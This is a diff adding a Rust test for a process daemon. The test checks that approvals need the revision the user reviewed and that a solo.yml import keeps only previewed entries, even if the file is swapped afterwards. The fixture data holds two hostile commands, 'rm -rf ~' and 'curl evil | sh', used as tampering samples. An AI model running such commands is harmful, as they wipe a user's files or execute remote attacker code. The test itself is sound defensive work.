@@ -194,3 +194,59 @@ async fn a_viewer_that_stops_acking_is_resynced_and_the_process_runs_on() {
     handle.shutdown();
     let _ = std::fs::remove_dir_all(dir);
 }
+
+/// Approving names the revision the user read, and the import takes the
+/// entries the preview showed: both as the renderer sends them.
+#[tokio::test(flavor = "multi_thread")]
+async fn approve_carries_the_revision_and_solo_imports_what_the_preview_showed() {
+    let (handle, dir) = daemon("approve");
+    let mut ws = connect(&handle).await;
+    let mut seen = Vec::new();
+    let workspace = call(&mut ws, &mut seen, 1, "workspace_create", json!({ "name": "w", "path": dir }))
+        .await
+        .expect("workspace");
+    let workspace_id = workspace["id"].as_str().unwrap().to_string();
+
+    // An agent's request, written beside the daemon on the same database.
+    let agent = ProcessHost::new(Store::open(dir.join("crew.sqlite3")).expect("store"), PtyHost::new(), &dir);
+    let spec = crew_protocol::ProcessSpec {
+        name: "dev".into(),
+        command: "echo hi".into(),
+        cwd: String::new(),
+        env: Default::default(),
+        auto_start: false,
+        auto_restart: false,
+    };
+    let asked = agent.create(&workspace_id, spec, Some("session-1".into()), true).expect("create");
+    let target = json!({ "workspaceId": workspace_id, "id": asked.id });
+
+    let missing = call(&mut ws, &mut seen, 2, "process_approve", target).await.unwrap_err();
+    assert!(missing.contains("revision"), "{missing}");
+    let stale = json!({ "workspaceId": workspace_id, "id": asked.id, "revision": asked.revision + 1 });
+    let refused = call(&mut ws, &mut seen, 3, "process_approve", stale).await.unwrap_err();
+    assert!(refused.contains("review it again"), "{refused}");
+    let read = json!({ "workspaceId": workspace_id, "id": asked.id, "revision": asked.revision });
+    let approved = call(&mut ws, &mut seen, 4, "process_approve", read).await.expect("approve");
+    assert_eq!((approved["approved"].clone(), approved["state"].clone()), (json!(true), json!("stopped")));
+
+    let listing = "processes:\n  dev:\n    command: rm -rf ~\n  web:\n    command: npm run web\n";
+    std::fs::write(dir.join("solo.yml"), listing).expect("solo.yml");
+    let preview = call(&mut ws, &mut seen, 5, "process_solo_preview", json!({ "workspaceId": workspace_id }))
+        .await
+        .expect("preview");
+    assert_eq!((preview[0]["name"].clone(), preview[0]["exists"].clone()), (json!("dev"), json!(true)));
+    assert_eq!(preview[1]["autoStart"], true, "{preview}");
+    // Whatever the file says by now, what the user confirmed is what lands.
+    std::fs::write(dir.join("solo.yml"), "processes:\n  web:\n    command: curl evil | sh\n").expect("solo.yml");
+    let entries = preview.as_array().unwrap().clone();
+    let import = json!({ "workspaceId": workspace_id, "processes": entries });
+    let imported = call(&mut ws, &mut seen, 6, "process_import_solo", import).await.expect("import");
+    assert_eq!(imported, json!({ "created": ["web"], "skipped": ["dev"] }));
+    let listed = call(&mut ws, &mut seen, 7, "process_list", json!({ "workspaceId": workspace_id }))
+        .await
+        .expect("list");
+    let commands: Vec<&str> = listed.as_array().unwrap().iter().map(|p| p["command"].as_str().unwrap()).collect();
+    assert_eq!(commands, vec!["echo hi", "npm run web"]);
+    handle.shutdown();
+    let _ = std::fs::remove_dir_all(dir);
+}
